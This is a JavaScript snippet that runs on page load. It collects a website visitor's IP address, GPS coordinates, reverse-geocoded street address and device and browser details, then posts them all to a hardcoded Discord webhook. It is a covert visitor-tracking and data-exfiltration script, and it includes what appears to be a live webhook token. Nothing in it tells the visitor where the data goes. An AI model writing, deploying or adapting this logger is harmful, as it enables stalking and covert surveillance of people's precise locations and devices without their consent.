// Replace with your Discord Webhook URL
const webhookUrl =
  "https://discord.com/api/webhooks/1284198893646778449/fz7almOkx_YxY_w1G5aq8Qr9nYIh7lMa64FBAOU59uzmYgQ2QmtQ0th86m7wz0MfKD3R";
// Function to send payload to Discord
function sendToDiscord(payload) {
  fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  })
    .then((response) => {
      if (response.ok) {
        console.log("Data sent to Discord successfully.");
      } else {
        console.error("Failed to send data to Discord.");
      }
    })
    .catch((error) => console.error("Error sending to Discord:", error));
}

// Function to get the visitor's IP address
function getIpAddress() {
  return fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => data.ip)
    .catch((error) => {
      console.error("Error fetching IP address:", error);
      return "Unknown";
    });
}

// Function to get the human-readable address from latitude and longitude
function getAddressFromCoordinates(latitude, longitude) {
  return fetch(
    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`
  )
    .then((response) => response.json())
    .then((data) => {
      const address = data.display_name || "Unknown Address";
      return address;
    })
    .catch((error) => {
      console.error("Error fetching address:", error);
      return "Unknown Address";
    });
}

// Get visitor's GPS coordinates
function getLocation() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          resolve({ latitude, longitude });
        },
        (error) => {
          console.error("Error getting location:", error);
          resolve({ latitude: "Unknown", longitude: "Unknown" });
        }
      );
    } else {
      console.error("Geolocation is not supported by this browser.");
      resolve({ latitude: "Unsupported", longitude: "Unsupported" });
    }
  });
}

// Function to get device-related information
function getDeviceInfo() {
  const deviceInfo = {};

  // Device type
  deviceInfo.deviceType = getDeviceType();

  // Operating System
  deviceInfo.os = getOS();

  // Browser type and version
  deviceInfo.browser = getBrowser();
  deviceInfo.browserVersion = getBrowserVersion();

  // Screen resolution
  deviceInfo.screenResolution = `${window.screen.width}x${window.screen.height}`;

  // Device screen width and height
  deviceInfo.screenWidth = window.innerWidth;
  deviceInfo.screenHeight = window.innerHeight;

  // Device pixel ratio
  deviceInfo.devicePixelRatio = window.devicePixelRatio;

  return deviceInfo;
}

// Helper functions to get device-related information
function getDeviceType() {
  const ua = navigator.userAgent;
  if (/Mobi|Android/i.test(ua)) {
    return "mobile";
  } else if (/iPad|Tablet/i.test(ua)) {
    return "tablet";
  }
  return "desktop";
}

function getOS() {
  const userAgent = window.navigator.userAgent;
  if (userAgent.includes("Windows")) {
    return "Windows";
  } else if (userAgent.includes("Mac OS")) {
    return "macOS";
  } else if (userAgent.includes("Linux")) {
    return "Linux";
  } else {
    return "Unknown";
  }
}

function getBrowser() {
  const userAgent = window.navigator.userAgent;
  if (userAgent.includes("Chrome")) {
    return "Chrome";
  } else if (userAgent.includes("Firefox")) {
    return "Firefox";
  } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
    return "Safari";
  } else {
    return "Unknown";
  }
}

function getBrowserVersion() {
  const userAgent = window.navigator.userAgent;
  const match = userAgent.match(/(Chrome|Firefox|Safari)\/([0-9.]+)/);
  if (match) {
    return match[2];
  } else {
    return "Unknown";
  }
}

// Main function to gather data and send to Discord
(async function main() {
  try {
    const ipAddress = await getIpAddress();
    const { latitude, longitude } = await getLocation();
    const address = await getAddressFromCoordinates(latitude, longitude);
    const deviceInfo = getDeviceInfo();

    const payload = {
      content: `
        Visitor's IP: ${ipAddress}\n
        Latitude: ${latitude}\n
        Longitude: ${longitude}\n
        Address: ${address}\n
        Device Type: ${deviceInfo.deviceType}\n
        Operating System: ${deviceInfo.os}\n
        Browser: ${deviceInfo.browser}\n
        Browser Version: ${deviceInfo.browserVersion}\n
        Screen Resolution: ${deviceInfo.screenResolution}\n
        Device Screen Width: ${deviceInfo.screenWidth}\n
        Device Screen Height: ${deviceInfo.screenHeight}\n
        Device Pixel Ratio: ${deviceInfo.devicePixelRatio}
      `,
    };

    // Send data to Discord
    sendToDiscord(payload);
  } catch (error) {
    console.error("Error in main function:", error);
  }
})();
